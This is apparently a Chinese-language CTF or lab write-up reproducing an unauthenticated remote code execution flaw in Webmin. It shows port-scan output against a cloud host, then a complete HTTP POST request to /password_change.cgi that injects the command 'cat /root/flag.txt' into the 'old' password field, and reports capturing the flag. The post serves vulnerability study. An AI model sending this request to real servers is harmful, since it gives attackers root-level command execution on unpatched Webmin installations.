+++
title = "webmin未授权远程代码执行漏洞"
date = 2026-06-17T21:47:41+08:00
draft = false
description = "一个CVE"
tags = ["漏洞分析", "漏洞复现"]
categories = ["漏洞分析", "漏洞复现"]
series = ["漏洞分析", "漏洞复现"]
pin = false
+++


rustscan  扫端口

F:\渗透测试\信息收集\x86_64-windows-rustscan.exe>rustscan.exe  -a 52.82.59.209
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "C:\\Users\\Luxury\\.rustscan.toml"
Open 52.82.59.209:22
Open 52.82.59.209:10000
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-15 15:09 +0800
Initiating Ping Scan at 15:09
Scanning 52.82.59.209 [4 ports]
Completed Ping Scan at 15:09, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:09
Completed Parallel DNS resolution of 1 host. at 15:09, 0.37s elapsed
DNS resolution of 1 IPs took 0.39s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:09
Scanning ec2-52-82-59-209.cn-northwest-1.compute.amazonaws.com.cn (52.82.59.209) [2 ports]
Discovered open port 22/tcp on 52.82.59.209
Discovered open port 10000/tcp on 52.82.59.209
Completed SYN Stealth Scan at 15:09, 0.04s elapsed (2 total ports)
Nmap scan report for ec2-52-82-59-209.cn-northwest-1.compute.amazonaws.com.cn (52.82.59.209)
Host is up, received reset ttl 46 (0.037s latency).
Scanned at 2026-04-15 15:09:15 �й���׼ʱ�� for 0s

PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 46
10000/tcp open  snet-sensor-mgmt syn-ack ttl 46

Read data files from: D:\Softs\nmap
Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds
           Raw packets sent: 7 (268B) | Rcvd: 4 (156B)


开放了22 和 10000端口

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260415151133319.png)

替换路由  /password_change.cgi   




![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260415151307234.png)




```c
POST /password_change.cgi HTTP/1.1
Host: 52.82.59.209:10000
Content-Length: 68
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://52.82.59.209:10000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://52.82.59.209:10000/
Accept-Encoding: gzip, deflate, br
Cookie: redirect=1; testing=1
Connection: keep-alive

user=yeyu&pam=1&expired=2&old=cat /root/flag.txt&new1=1111&new2=1111
```

成功获取flag  

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260415153246715.png)



